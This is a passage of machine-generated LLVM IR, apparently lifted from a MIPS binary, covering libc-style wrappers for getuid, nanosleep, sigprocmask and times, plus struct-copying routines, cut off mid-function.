  %v3_40793c = load i32, i32* @global_var_449b80, align 4
  %v1_40794c = icmp eq i32 %v3_40793c, 0
  %.v3_40793c = select i1 %v1_40794c, i32 65536, i32 %v3_40793c
  ret i32 %.v3_40793c

; uselistorder directives
  uselistorder i32 65536, { 12, 0, 1, 2, 3, 4, 5, 6, 7, 8, 9, 10, 11 }
}

define i32 @function_407960() local_unnamed_addr {
dec_label_pc_407960:
  %s0.global-to-local = alloca i32, align 4
  %v0_407980 = call i32 @getuid()
  %v3_407984 = load i32, i32* @global_var_449b6c.83, align 4
  store i32 %v3_407984, i32* @t9, align 4
  %v0_407988 = load i32, i32* @a3, align 4
  %v1_407988 = icmp eq i32 %v0_407988, 0
  store i32 %v0_407980, i32* %s0.global-to-local, align 4
  br i1 %v1_407988, label %dec_label_pc_4079a4, label %dec_label_pc_40798c

dec_label_pc_40798c:                              ; preds = %dec_label_pc_407960
  %v1_407990 = call i32 @function_4057a0()
  %v0_40799c = load i32, i32* %s0.global-to-local, align 4
  %v2_40799c = inttoptr i32 %v1_407990 to i32*
  store i32 %v0_40799c, i32* %v2_40799c, align 4
  br label %dec_label_pc_4079a4

dec_label_pc_4079a4:                              ; preds = %dec_label_pc_407960, %dec_label_pc_40798c
  %v4_4079ac = phi i32 [ %v0_407980, %dec_label_pc_407960 ], [ -1, %dec_label_pc_40798c ]
  ret i32 %v4_4079ac

; uselistorder directives
  uselistorder label %dec_label_pc_4079a4, { 1, 0 }
}

define i32 @function_4079c0(i32 %arg1, i32 %arg2) local_unnamed_addr {
dec_label_pc_407a30:
  %a0.global-to-local = alloca i32, align 4
  %v0.global-to-local = alloca i32, align 4
  %stack_var_-24 = alloca i32, align 4
  store i32 4140, i32* %v0.global-to-local, align 4
  %v3_407a08 = load i32, i32* @global_var_449b6c.83, align 4
  store i32 %v3_407a08, i32* @t9, align 4
  store i32 4140, i32* %a0.global-to-local, align 4
  %v1_407a18 = call i32 @function_4057a0()
  store i32 %v1_407a18, i32* %v0.global-to-local, align 4
  store i32 -1, i32* %a0.global-to-local, align 4
  %v2_407a2c = inttoptr i32 %v1_407a18 to i32*
  store i32 4140, i32* %v2_407a2c, align 4
  %v0_407a30.pr = load i32, i32* %v0.global-to-local, align 4
  %phitmp = icmp eq i32 %v0_407a30.pr, 0
  br i1 %phitmp, label %dec_label_pc_407a44, label %dec_label_pc_407a34

dec_label_pc_407a34:                              ; preds = %dec_label_pc_407a30
  %v0_407a38 = load i32, i32* %a0.global-to-local, align 4
  store i32 %v0_407a38, i32* %v0.global-to-local, align 4
  br label %dec_label_pc_407a44

dec_label_pc_407a44:                              ; preds = %dec_label_pc_407a30, %dec_label_pc_407a34
  %v3_407a44 = load i32, i32* %stack_var_-24, align 4
  store i32 %v3_407a44, i32* %v0.global-to-local, align 4
  ret i32 %v3_407a44

; uselistorder directives
  uselistorder i32* %v0.global-to-local, { 0, 1, 3, 4, 2 }
  uselistorder label %dec_label_pc_407a44, { 1, 0 }
}

define i32 @function_407a70(%timespec* %arg1, i32 %arg2, i32 %arg3) local_unnamed_addr {
dec_label_pc_407a70:
  %s0.global-to-local = alloca i32, align 4
  %tmp = inttoptr i32 %arg2 to %timespec*
  %v6_407a90 = call i32 @nanosleep(%timespec* %arg1, %timespec* %tmp)
  %v3_407a94 = load i32, i32* @global_var_449b6c.83, align 4
  store i32 %v3_407a94, i32* @t9, align 4
  %v1_407a98 = icmp eq i32 %arg3, 0
  store i32 %v6_407a90, i32* %s0.global-to-local, align 4
  br i1 %v1_407a98, label %dec_label_pc_407ab4, label %dec_label_pc_407a9c

dec_label_pc_407a9c:                              ; preds = %dec_label_pc_407a70
  %v1_407aa0 = call i32 @function_4057a0()
  %v0_407aac = load i32, i32* %s0.global-to-local, align 4
  %v2_407aac = inttoptr i32 %v1_407aa0 to i32*
  store i32 %v0_407aac, i32* %v2_407aac, align 4
  br label %dec_label_pc_407ab4

dec_label_pc_407ab4:                              ; preds = %dec_label_pc_407a70, %dec_label_pc_407a9c
  %v4_407abc = phi i32 [ %v6_407a90, %dec_label_pc_407a70 ], [ -1, %dec_label_pc_407a9c ]
  ret i32 %v4_407abc

; uselistorder directives
  uselistorder label %dec_label_pc_407ab4, { 1, 0 }
}

define i32 @function_407ad0(i32 %arg1) local_unnamed_addr {
dec_label_pc_407ad0:
  %s1.global-to-local = alloca i32, align 4
  %v0.global-to-local = alloca i32, align 4
  %v3_407af0 = load i32, i32* bitcast (i32** @global_var_449b74.276 to i32*), align 4
  store i32 %arg1, i32* %s1.global-to-local, align 4
  store i32 %v3_407af0, i32* %v0.global-to-local, align 4
  %v3_407afc = load i32, i32* @global_var_449c4c.277, align 4
  store i32 %v3_407afc, i32* @t9, align 4
  %v1_407b00 = icmp eq i32 %v3_407af0, 0
  br i1 %v1_407b00, label %dec_label_pc_407b04, label %dec_label_pc_407b24

dec_label_pc_407b04:                              ; preds = %dec_label_pc_407ad0
  %v3_407b08 = call i32 @function_4081c0(i32* null)
  store i32 %v3_407b08, i32* %v0.global-to-local, align 4
  %v1_407b14 = icmp slt i32 %v3_407b08, 0
  br i1 %v1_407b14, label %dec_label_pc_407b44, label %dec_label_pc_407b18

dec_label_pc_407b18:                              ; preds = %dec_label_pc_407b04
  %v3_407b1c = load i32, i32* @global_var_449c4c.277, align 4
  %v2_407b20 = load i32, i32* bitcast (i32** @global_var_449b74.276 to i32*), align 4
  store i32 %v2_407b20, i32* %v0.global-to-local, align 4
  %v0_407b24.pre = load i32, i32* %s1.global-to-local, align 4
  br label %dec_label_pc_407b24

dec_label_pc_407b24:                              ; preds = %dec_label_pc_407ad0, %dec_label_pc_407b18
  %v0_407b30 = phi i32 [ %v3_407afc, %dec_label_pc_407ad0 ], [ %v3_407b1c, %dec_label_pc_407b18 ]
  %v0_407b2c = phi i32 [ %v3_407af0, %dec_label_pc_407ad0 ], [ %v2_407b20, %dec_label_pc_407b18 ]
  %v1_407b2c = phi i32 [ %arg1, %dec_label_pc_407ad0 ], [ %v0_407b24.pre, %dec_label_pc_407b18 ]
  %v1_407b24 = icmp eq i32 %v1_407b2c, 0
  br i1 %v1_407b24, label %dec_label_pc_407b48, label %dec_label_pc_407b28

dec_label_pc_407b28:                              ; preds = %dec_label_pc_407b24
  call void @__pseudo_call(i32 %v0_407b30)
  %v0_407b3c = load i32, i32* %v0.global-to-local, align 4
  %v1_407b3c = icmp sgt i32 %v0_407b3c, -1
  store i32 %v0_407b2c, i32* %v0.global-to-local, align 4
  br i1 %v1_407b3c, label %dec_label_pc_407b4c, label %dec_label_pc_407b44

dec_label_pc_407b44:                              ; preds = %dec_label_pc_407b28, %dec_label_pc_407b04
  br label %dec_label_pc_407b48

dec_label_pc_407b48:                              ; preds = %dec_label_pc_407b24, %dec_label_pc_407b44
  %v0_407b48 = phi i32 [ %v0_407b2c, %dec_label_pc_407b24 ], [ -1, %dec_label_pc_407b44 ]
  store i32 %v0_407b48, i32* %v0.global-to-local, align 4
  br label %dec_label_pc_407b4c

dec_label_pc_407b4c:                              ; preds = %dec_label_pc_407b28, %dec_label_pc_407b48
  %v4_407b58 = phi i32 [ %v0_407b2c, %dec_label_pc_407b28 ], [ %v0_407b48, %dec_label_pc_407b48 ]
  ret i32 %v4_407b58

; uselistorder directives
  uselistorder i32 %v0_407b2c, { 1, 2, 0 }
  uselistorder i32* %v0.global-to-local, { 0, 1, 3, 2, 5, 4 }
  uselistorder i32* null, { 1, 0, 2, 8, 9, 3, 4, 5, 6, 7 }
  uselistorder label %dec_label_pc_407b4c, { 1, 0 }
  uselistorder label %dec_label_pc_407b48, { 1, 0 }
  uselistorder label %dec_label_pc_407b24, { 1, 0 }
}

define i32 @function_407b60(i32 %arg1, %_TYPEDEF_sigset_t* %arg2, i32 %arg3) local_unnamed_addr {
dec_label_pc_407b60:
  %a0.global-to-local = alloca i32, align 4
  %a3.global-to-local = alloca i32, align 4
  %s0.global-to-local = alloca i32, align 4
  %tmp = inttoptr i32 %arg3 to %_TYPEDEF_sigset_t*
  store i32 %arg1, i32* %a0.global-to-local, align 4
  %v2_407b80 = icmp eq %_TYPEDEF_sigset_t* %arg2, null
  br i1 %v2_407b80, label %dec_label_pc_407bb0, label %dec_label_pc_407b84

dec_label_pc_407b84:                              ; preds = %dec_label_pc_407b60
  %v1_407b7c = add i32 %arg1, -1
  %v4_407b80 = icmp ult i32 %v1_407b7c, 3
  %v3_407b88 = load i32, i32* @global_var_449b6c.83, align 4
  store i32 %v3_407b88, i32* @t9, align 4
  %v1_407b8c = icmp eq i1 %v4_407b80, false
  store i32 16, i32* %a3.global-to-local, align 4
  br i1 %v1_407b8c, label %dec_label_pc_407b90, label %dec_label_pc_407bb4

dec_label_pc_407b90:                              ; preds = %dec_label_pc_407b84
  %v1_407b94 = call i32 @function_4057a0()
  store i32 -1, i32* %a0.global-to-local, align 4
  %v2_407bac = inttoptr i32 %v1_407b94 to i32*
  store i32 22, i32* %v2_407bac, align 4
  %v0_407bb8.pre.pre = load i32, i32* %a0.global-to-local, align 4
  br label %dec_label_pc_407bb0

dec_label_pc_407bb0:                              ; preds = %dec_label_pc_407b60, %dec_label_pc_407b90
  %v0_407bb8.pre = phi i32 [ %arg1, %dec_label_pc_407b60 ], [ %v0_407bb8.pre.pre, %dec_label_pc_407b90 ]
  store i32 16, i32* %a3.global-to-local, align 4
  br label %dec_label_pc_407bb4

dec_label_pc_407bb4:                              ; preds = %dec_label_pc_407b84, %dec_label_pc_407bb0
  %v0_407bb8 = phi i32 [ %arg1, %dec_label_pc_407b84 ], [ %v0_407bb8.pre, %dec_label_pc_407bb0 ]
  %v7_407bb8 = call i32 @sigprocmask(i32 %v0_407bb8, %_TYPEDEF_sigset_t* %arg2, %_TYPEDEF_sigset_t* %tmp)
  %v3_407bbc = load i32, i32* @global_var_449b6c.83, align 4
  store i32 %v3_407bbc, i32* @t9, align 4
  store i32 %v7_407bb8, i32* %s0.global-to-local, align 4
  %v0_407bc4 = load i32, i32* %a3.global-to-local, align 4
  %v1_407bc4 = icmp eq i32 %v0_407bc4, 0
  store i32 %v7_407bb8, i32* %a0.global-to-local, align 4
  br i1 %v1_407bc4, label %dec_label_pc_407be0, label %dec_label_pc_407bc8

dec_label_pc_407bc8:                              ; preds = %dec_label_pc_407bb4
  %v1_407bcc = call i32 @function_4057a0()
  store i32 -1, i32* %a0.global-to-local, align 4
  %v0_407bdc = load i32, i32* %s0.global-to-local, align 4
  %v2_407bdc = inttoptr i32 %v1_407bcc to i32*
  store i32 %v0_407bdc, i32* %v2_407bdc, align 4
  %v0_407be8.pre = load i32, i32* %a0.global-to-local, align 4
  br label %dec_label_pc_407be0

dec_label_pc_407be0:                              ; preds = %dec_label_pc_407bb4, %dec_label_pc_407bc8
  %v0_407be8 = phi i32 [ %v7_407bb8, %dec_label_pc_407bb4 ], [ %v0_407be8.pre, %dec_label_pc_407bc8 ]
  ret i32 %v0_407be8

; uselistorder directives
  uselistorder i32* %a3.global-to-local, { 1, 0, 2 }
  uselistorder i32* %a0.global-to-local, { 1, 2, 3, 4, 5, 0 }
  uselistorder i32 22, { 1, 2, 16, 3, 4, 17, 5, 18, 6, 19, 7, 20, 8, 21, 9, 22, 10, 23, 11, 24, 12, 25, 13, 26, 14, 27, 15, 28, 0 }
  uselistorder i32 %arg1, { 1, 2, 0, 3 }
  uselistorder label %dec_label_pc_407be0, { 1, 0 }
  uselistorder label %dec_label_pc_407bb4, { 1, 0 }
  uselistorder label %dec_label_pc_407bb0, { 1, 0 }
}

define i32 @function_407c00(%tms* %arg1) local_unnamed_addr {
dec_label_pc_407c00:
  %s0.global-to-local = alloca i32, align 4
  %v3_407c20 = call i32 @times(%tms* %arg1)
  %v3_407c24 = load i32, i32* @global_var_449b6c.83, align 4
  store i32 %v3_407c24, i32* @t9, align 4
  %v0_407c28 = load i32, i32* @a3, align 4
  %v1_407c28 = icmp eq i32 %v0_407c28, 0
  store i32 %v3_407c20, i32* %s0.global-to-local, align 4
  br i1 %v1_407c28, label %dec_label_pc_407c44, label %dec_label_pc_407c2c

dec_label_pc_407c2c:                              ; preds = %dec_label_pc_407c00
  %v1_407c30 = call i32 @function_4057a0()
  %v0_407c3c = load i32, i32* %s0.global-to-local, align 4
  %v2_407c3c = inttoptr i32 %v1_407c30 to i32*
  store i32 %v0_407c3c, i32* %v2_407c3c, align 4
  br label %dec_label_pc_407c44

dec_label_pc_407c44:                              ; preds = %dec_label_pc_407c00, %dec_label_pc_407c2c
  %v4_407c4c = phi i32 [ %v3_407c20, %dec_label_pc_407c00 ], [ -1, %dec_label_pc_407c2c ]
  ret i32 %v4_407c4c

; uselistorder directives
  uselistorder label %dec_label_pc_407c44, { 1, 0 }
}

define i32 @function_407c60(i32* %arg1, i32 %arg2) local_unnamed_addr {
dec_label_pc_407c60:
  %s0.global-to-local = alloca i32, align 4
  %s1.global-to-local = alloca i32, align 4
  %v0.global-to-local = alloca i32, align 4
  %v1.global-to-local = alloca i32, align 4
  %tmp = ptrtoint i32* %arg1 to i32
  store i32 %arg2, i32* %s0.global-to-local, align 4
  store i32 %tmp, i32* %s1.global-to-local, align 4
  %v4_407c94 = inttoptr i32 %arg2 to i32*
  %v5_407c94 = call i32 @function_405830(i32* %v4_407c94, i32 0, i32 160)
  store i32 %v5_407c94, i32* %v0.global-to-local, align 4
  %v2_407c9c = load i32, i32* %arg1, align 4
  store i32 %v2_407c9c, i32* %v0.global-to-local, align 4
  %v0_407ca4 = load i32, i32* %s0.global-to-local, align 4
  %v1_407ca4 = add i32 %v0_407ca4, 4
  %v2_407ca4 = inttoptr i32 %v1_407ca4 to i32*
  store i32 0, i32* %v2_407ca4, align 4
  %v0_407ca8 = load i32, i32* %v0.global-to-local, align 4
  %v1_407ca8 = load i32, i32* %s0.global-to-local, align 4
  %v2_407ca8 = inttoptr i32 %v1_407ca8 to i32*
  store i32 %v0_407ca8, i32* %v2_407ca8, align 4
  %v0_407cac = load i32, i32* %s1.global-to-local, align 4
  %v1_407cac = add i32 %v0_407cac, 16
  %v2_407cac = inttoptr i32 %v1_407cac to i32*
  %v3_407cac = load i32, i32* %v2_407cac, align 4
  store i32 %v3_407cac, i32* %v0.global-to-local, align 4
  %v1_407cb0 = add i32 %v0_407cac, 20
  %v2_407cb0 = inttoptr i32 %v1_407cb0 to i32*
  %v3_407cb0 = load i32, i32* %v2_407cb0, align 4
  store i32 %v3_407cb0, i32* %v1.global-to-local, align 4
  %v1_407cb4 = load i32, i32* %s0.global-to-local, align 4
  %v2_407cb4 = add i32 %v1_407cb4, 16
  %v3_407cb4 = inttoptr i32 %v2_407cb4 to i32*
  store i32 %v3_407cac, i32* %v3_407cb4, align 4
  %v0_407cb8 = load i32, i32* %v1.global-to-local, align 4
  %v1_407cb8 = load i32, i32* %s0.global-to-local, align 4
  %v2_407cb8 = add i32 %v1_407cb8, 20
  %v3_407cb8 = inttoptr i32 %v2_407cb8 to i32*
  store i32 %v0_407cb8, i32* %v3_407cb8, align 4
  %v0_407cbc = load i32, i32* %s1.global-to-local, align 4
  %v1_407cbc = add i32 %v0_407cbc, 24
  %v2_407cbc = inttoptr i32 %v1_407cbc to i32*
  %v3_407cbc = load i32, i32* %v2_407cbc, align 4
  store i32 %v3_407cbc, i32* %v0.global-to-local, align 4
  %v1_407cc4 = load i32, i32* %s0.global-to-local, align 4
  %v2_407cc4 = add i32 %v1_407cc4, 24
  %v3_407cc4 = inttoptr i32 %v2_407cc4 to i32*
  store i32 %v3_407cbc, i32* %v3_407cc4, align 4
  %v0_407cc8 = load i32, i32* %s1.global-to-local, align 4
  %v1_407cc8 = add i32 %v0_407cc8, 28
  %v2_407cc8 = inttoptr i32 %v1_407cc8 to i32*
  %v3_407cc8 = load i32, i32* %v2_407cc8, align 4
  store i32 %v3_407cc8, i32* %v0.global-to-local, align 4
  %v1_407cd0 = load i32, i32* %s0.global-to-local, align 4
  %v2_407cd0 = add i32 %v1_407cd0, 28
  %v3_407cd0 = inttoptr i32 %v2_407cd0 to i32*
  store i32 %v3_407cc8, i32* %v3_407cd0, align 4
  %v0_407cd4 = load i32, i32* %s1.global-to-local, align 4
  %v1_407cd4 = add i32 %v0_407cd4, 32
  %v2_407cd4 = inttoptr i32 %v1_407cd4 to i32*
  %v3_407cd4 = load i32, i32* %v2_407cd4, align 4
  store i32 %v3_407cd4, i32* %v0.global-to-local, align 4
  %v1_407cdc = load i32, i32* %s0.global-to-local, align 4
  %v2_407cdc = add i32 %v1_407cdc, 32
  %v3_407cdc = inttoptr i32 %v2_407cdc to i32*
  store i32 %v3_407cd4, i32* %v3_407cdc, align 4
  %v0_407ce0 = load i32, i32* %s1.global-to-local, align 4
  %v1_407ce0 = add i32 %v0_407ce0, 36
  %v2_407ce0 = inttoptr i32 %v1_407ce0 to i32*
  %v3_407ce0 = load i32, i32* %v2_407ce0, align 4
  store i32 %v3_407ce0, i32* %v0.global-to-local, align 4
  %v1_407ce8 = load i32, i32* %s0.global-to-local, align 4
  %v2_407ce8 = add i32 %v1_407ce8, 36
  %v3_407ce8 = inttoptr i32 %v2_407ce8 to i32*
  store i32 %v3_407ce0, i32* %v3_407ce8, align 4
  %v0_407cec = load i32, i32* %s1.global-to-local, align 4
  %v1_407cec = add i32 %v0_407cec, 40
  %v2_407cec = inttoptr i32 %v1_407cec to i32*
  %v3_407cec = load i32, i32* %v2_407cec, align 4
  store i32 %v3_407cec, i32* %v0.global-to-local, align 4
  %v0_407cf0 = load i32, i32* %s0.global-to-local, align 4
  %v1_407cf0 = add i32 %v0_407cf0, 44
  %v2_407cf0 = inttoptr i32 %v1_407cf0 to i32*
  store i32 0, i32* %v2_407cf0, align 4
  %v0_407cf4 = load i32, i32* %v0.global-to-local, align 4
  %v1_407cf4 = load i32, i32* %s0.global-to-local, align 4
  %v2_407cf4 = add i32 %v1_407cf4, 40
  %v3_407cf4 = inttoptr i32 %v2_407cf4 to i32*
  store i32 %v0_407cf4, i32* %v3_407cf4, align 4
  %v0_407cf8 = load i32, i32* %s1.global-to-local, align 4
  %v1_407cf8 = add i32 %v0_407cf8, 56
  %v2_407cf8 = inttoptr i32 %v1_407cf8 to i32*
  %v3_407cf8 = load i32, i32* %v2_407cf8, align 4
  store i32 %v3_407cf8, i32* %v0.global-to-local, align 4
  %v1_407cfc = add i32 %v0_407cf8, 60
  %v2_407cfc = inttoptr i32 %v1_407cfc to i32*
  %v3_407cfc = load i32, i32* %v2_407cfc, align 4
  store i32 %v3_407cfc, i32* %v1.global-to-local, align 4
  %v1_407d00 = load i32, i32* %s0.global-to-local, align 4
  %v2_407d00 = add i32 %v1_407d00, 56
  %v3_407d00 = inttoptr i32 %v2_407d00 to i32*
  store i32 %v3_407cf8, i32* %v3_407d00, align 4
  %v0_407d04 = load i32, i32* %v1.global-to-local, align 4
  %v1_407d04 = load i32, i32* %s0.global-to-local, align 4
  %v2_407d04 = add i32 %v1_407d04, 60
  %v3_407d04 = inttoptr i32 %v2_407d04 to i32*
  store i32 %v0_407d04, i32* %v3_407d04, align 4
  %v0_407d08 = load i32, i32* %s1.global-to-local, align 4
  %v1_407d08 = add i32 %v0_407d08, 88
  %v2_407d08 = inttoptr i32 %v1_407d08 to i32*
  %v3_407d08 = load i32, i32* %v2_407d08, align 4
  store i32 %v3_407d08, i32* %v0.global-to-local, align 4
  %v1_407d10 = load i32, i32* %s0.global-to-local, align 4
  %v2_407d10 = add i32 %v1_407d10, 88
  %v3_407d10 = inttoptr i32 %v2_407d10 to i32*
  store i32 %v3_407d08, i32* %v3_407d10, align 4
  %v0_407d14 = load i32, i32* %s1.global-to-local, align 4
  %v1_407d14 = add i32 %v0_407d14, 96
  %v2_407d14 = inttoptr i32 %v1_407d14 to i32*
  %v3_407d14 = load i32, i32* %v2_407d14, align 4
  store i32 %v3_407d14, i32* %v0.global-to-local, align 4
  %v1_407d18 = add i32 %v0_407d14, 100
  %v2_407d18 = inttoptr i32 %v1_407d18 to i32*
  %v3_407d18 = load i32, i32* %v2_407d18, align 4
  store i32 %v3_407d18, i32* %v1.global-to-local, align 4
  %v1_407d1c = load i32, i32* %s0.global-to-local, align 4
  %v2_407d1c = add i32 %v1_407d1c, 96
  %v3_407d1c = inttoptr i32 %v2_407d1c to i32*
  store i32 %v3_407d14, i32* %v3_407d1c, align 4
  %v0_407d20 = load i32, i32* %v1.global-to-local, align 4
  %v1_407d20 = load i32, i32* %s0.global-to-local, align 4
  %v2_407d20 = add i32 %v1_407d20, 100
  %v3_407d20 = inttoptr i32 %v2_407d20 to i32*
  store i32 %v0_407d20, i32* %v3_407d20, align 4
  %v0_407d24 = load i32, i32* %s1.global-to-local, align 4
  %v1_407d24 = add i32 %v0_407d24, 64
  %v2_407d24 = inttoptr i32 %v1_407d24 to i32*
  %v3_407d24 = load i32, i32* %v2_407d24, align 4
  store i32 %v3_407d24, i32* %v0.global-to-local, align 4
  %v1_407d2c = load i32, i32* %s0.global-to-local, align 4
  %v2_407d2c = add i32 %v1_407d2c, 64
  %v3_407d2c = inttoptr i32 %v2_407d2c to i32*
  store i32 %v3_407d24, i32* %v3_407d2c, align 4
  %v0_407d30 = load i32, i32* %s1.global-to-local, align 4
  %v1_407d30 = add i32 %v0_407d30, 72
  %v2_407d30 = inttoptr i32 %v1_407d30 to i32*
  %v3_407d30 = load i32, i32* %v2_407d30, align 4
  store i32 %v3_407d30, i32* %v0.global-to-local, align 4
  %v1_407d38 = load i32, i32* %s0.global-to-local, align 4
  %v2_407d38 = add i32 %v1_407d38, 72
  %v3_407d38 = inttoptr i32 %v2_407d38 to i32*
  store i32 %v3_407d30, i32* %v3_407d38, align 4
  %v0_407d3c = load i32, i32* %s1.global-to-local, align 4
  %v1_407d3c = add i32 %v0_407d3c, 80
  %v2_407d3c = inttoptr i32 %v1_407d3c to i32*
  %v3_407d3c = load i32, i32* %v2_407d3c, align 4
  store i32 %v3_407d3c, i32* %v0.global-to-local, align 4
  %v1_407d44 = load i32, i32* %s0.global-to-local, align 4
  %v2_407d44 = add i32 %v1_407d44, 80
  %v3_407d44 = inttoptr i32 %v2_407d44 to i32*
  store i32 %v3_407d3c, i32* %v3_407d44, align 4
  %v0_407d48 = load i32, i32* %s1.global-to-local, align 4
  %v1_407d48 = add i32 %v0_407d48, 68
  %v2_407d48 = inttoptr i32 %v1_407d48 to i32*
  %v3_407d48 = load i32, i32* %v2_407d48, align 4
  store i32 %v3_407d48, i32* %v0.global-to-local, align 4
  %v1_407d50 = load i32, i32* %s0.global-to-local, align 4
  %v2_407d50 = add i32 %v1_407d50, 68
  %v3_407d50 = inttoptr i32 %v2_407d50 to i32*
  store i32 %v3_407d48, i32* %v3_407d50, align 4
  %v0_407d54 = load i32, i32* %s1.global-to-local, align 4
  %v1_407d54 = add i32 %v0_407d54, 76
  %v2_407d54 = inttoptr i32 %v1_407d54 to i32*
  %v3_407d54 = load i32, i32* %v2_407d54, align 4
  store i32 %v3_407d54, i32* %v0.global-to-local, align 4
  %v1_407d5c = load i32, i32* %s0.global-to-local, align 4
  %v2_407d5c = add i32 %v1_407d5c, 76
  %v3_407d5c = inttoptr i32 %v2_407d5c to i32*
  store i32 %v3_407d54, i32* %v3_407d5c, align 4
  %v0_407d60 = load i32, i32* %s1.global-to-local, align 4
  %v1_407d60 = add i32 %v0_407d60, 84
  %v2_407d60 = inttoptr i32 %v1_407d60 to i32*
  %v3_407d60 = load i32, i32* %v2_407d60, align 4
  store i32 %v3_407d60, i32* %v0.global-to-local, align 4
  %v1_407d68 = load i32, i32* %s0.global-to-local, align 4
  %v2_407d68 = add i32 %v1_407d68, 84
  %v3_407d68 = inttoptr i32 %v2_407d68 to i32*
  store i32 %v3_407d60, i32* %v3_407d68, align 4
  ret i32 %v3_407d60

; uselistorder directives
  uselistorder i32* %s0.global-to-local, { 0, 1, 2, 3, 12, 4, 5, 6, 7, 8, 9, 10, 11, 20, 13, 14, 15, 16, 17, 18, 19, 21 }
  uselistorder i32 100, { 2, 3, 1, 0, 4 }
  uselistorder i32 %arg2, { 1, 0 }
}

define i32 @function_407d80(i32* %arg1, i32 %arg2) local_unnamed_addr {
dec_label_pc_407d80:
  %s0.global-to-local = alloca i32, align 4
  %s1.global-to-local = alloca i32, align 4
  %v0.global-to-local = alloca i32, align 4
  %tmp = ptrtoint i32* %arg1 to i32
  store i32 %arg2, i32* %s0.global-to-local, align 4
  store i32 %tmp, i32* %s1.global-to-local, align 4
  %v4_407db4 = inttoptr i32 %arg2 to i32*
  %v5_407db4 = call i32 @function_405830(i32* %v4_407db4, i32 0, i32 152)
  store i32 %v5_407db4, i32* %v0.global-to-local, align 4
  %v2_407dbc = load i32, i32* %arg1, align 4
  store i32 %v2_407dbc, i32* %v0.global-to-local, align 4
  %v0_407dc4 = load i32, i32* %s0.global-to-local, align 4
  %v1_407dc4 = add i32 %v0_407dc4, 4
  %v2_407dc4 = inttoptr i32 %v1_407dc4 to i32*
  store i32 0, i32* %v2_407dc4, align 4
  %v0_407dc8 = load i32, i32* %v0.global-to-local, align 4
  %v1_407dc8 = load i32, i32* %s0.global-to-local, align 4
  %v2_407dc8 = inttoptr i32 %v1_407dc8 to i32*
  store i32 %v0_407dc8, i32* %v2_407dc8, align 4
  %v0_407dcc = load i32, i32* %s1.global-to-local, align 4
  %v1_407dcc = add i32 %v0_407dcc, 16
  %v2_407dcc = inttoptr i32 %v1_407dcc to i32*
  %v3_407dcc = load i32, i32* %v2_407dcc, align 4
  store i32 %v3_407dcc, i32* %v0.global-to-local, align 4
  %v1_407dd4 = load i32, i32* %s0.global-to-local, align 4
  %v2_407dd4 = add i32 %v1_407dd4, 16
  %v3_407dd4 = inttoptr i32 %v2_407dd4 to i32*
  store i32 %v3_407dcc, i32* %v3_407dd4, align 4
  %v0_407dd8 = load i32, i32* %s1.global-to-local, align 4
  %v1_407dd8 = add i32 %v0_407dd8, 20
  %v2_407dd8 = inttoptr i32 %v1_407dd8 to i32*
  %v3_407dd8 = load i32, i32* %v2_407dd8, align 4
  store i32 %v3_407dd8, i32* %v0.global-to-local, align 4
  %v1_407de0 = load i32, i32* %s0.global-to-local, align 4
  %v2_407de0 = add i32 %v1_407de0, 20
  %v3_407de0 = inttoptr i32 %v2_407de0 to i32*
  store i32 %v3_407dd8, i32* %v3_407de0, align 4
  %v0_407de4 = load i32, i32* %s1.global-to-local, align 4
  %v1_407de4 = add i32 %v0_407de4, 24
  %v2_407de4 = inttoptr i32 %v1_407de4 to i32*
  %v3_407de4 = load i32, i32* %v2_407de4, align 4
  store i32 %v3_407de4, i32* %v0.global-to-local, align 4
  %v1_407dec = load i32, i32* %s0.global-to-local, align 4
  %v2_407dec = add i32 %v1_407dec, 24
  %v3_407dec = inttoptr i32 %v2_407dec to i32*
  store i32 %v3_407de4, i32* %v3_407dec, align 4
  %v0_407df0 = load i32, i32* %s1.global-to-local, align 4
  %v1_407df0 = add i32 %v0_407df0, 28
  %v2_407df0 = inttoptr i32 %v1_407df0 to i32*
  %v3_407df0 = load i32, i32* %v2_407df0, align 4
  store i32 %v3_407df0, i32* %v0.global-to-local, align 4
  %v1_407df8 = load i32, i32* %s0.global-to-local, align 4
  %v2_407df8 = add i32 %v1_407df8, 28
  %v3_407df8 = inttoptr i32 %v2_407df8 to i32*
  store i32 %v3_407df0, i32* %v3_407df8, align 4
  %v0_407dfc = load i32, i32* %s1.global-to-local, align 4
  %v1_407dfc = add i32 %v0_407dfc, 32
  %v2_407dfc = inttoptr i32 %v1_407dfc to i32*
  %v3_407dfc = load i32, i32* %v2_407dfc, align 4
  store i32 %v3_407dfc, i32* %v0.global-to-local, align 4
  %v1_407e04 = load i32, i32* %s0.global-to-local, align 4
  %v2_407e04 = add i32 %v1_407e04, 32
  %v3_407e04 = inttoptr i32 %v2_407e04 to i32*
  store i32 %v3_407dfc, i32* %v3_407e04, align 4
  %v0_407e08 = load i32, i32* %s1.global-to-local, align 4
  %v1_407e08 = add i32 %v0_407e08, 36
  %v2_407e08 = inttoptr i32 %v1_407e08 to i32*
  %v3_407e08 = load i32, i32* %v2_407e08, align 4
  store i32 %v3_407e08, i32* %v0.global-to-local, align 4
  %v0_407e0c = load i32, i32* %s0.global-to-local, align 4
  %v1_407e0c = add i32 %v0_407e0c, 44
  %v2_407e0c = inttoptr i32 %v1_407e0c to i32*
  store i32 0, i32* %v2_407e0c, align 4
  %v0_407e10 = load i32, i32* %v0.global-to-local, align 4
  %v1_407e10 = load i32, i32* %s0.global-to-local, align 4
  %v2_407e10 = add i32 %v1_407e10, 40
  %v3_407e10 = inttoptr i32 %v2_407e10 to i32*
  store i32 %v0_407e10, i32* %v3_407e10, align 4
  %v0_407e14 = load i32, i32* %s1.global-to-local, align 4
  %v1_407e14 = add i32 %v0_407e14, 48
  %v2_407e14 = inttoptr i32 %v1_407e14 to i32*
  %v3_407e14 = load i32, i32* %v2_407e14, align 4
  store i32 %v3_407e14, i32* %v0.global-to-local, align 4
  %v1_407e1c = load i32, i32* %s0.global-to-local, align 4
  %v2_407e1c = add i32 %v1_407e1c, 52
  %v3_407e1c = inttoptr i32 %v2_407e1c to i32*
  store i32 %v3_407e14, i32* %v3_407e1c, align 4
  %v0_407e20 = load i32, i32* %s1.global-to-local, align 4
  %v1_407e20 = add i32 %v0_407e20, 80
  %v2_407e20 = inttoptr i32 %v1_407e20 to i32*
  %v3_407e20 = load i32, i32* %v2_407e20, align 4
  store i32 %v3_407e20, i32* %v0.global-to-local, align 4
  %v1_407e28 = load i32, i32* %s0.global-to-local, align 4
  %v2_407e28 = add i32 %v1_407e28, 84
  %v3_407e28 = inttoptr i32 %v2_407e28 to i32*
  store i32 %v3_407e20, i32* %v3_407e28, align 4
  %v0_407e2c = load i32, i32* %s1.global-to-local, align 4
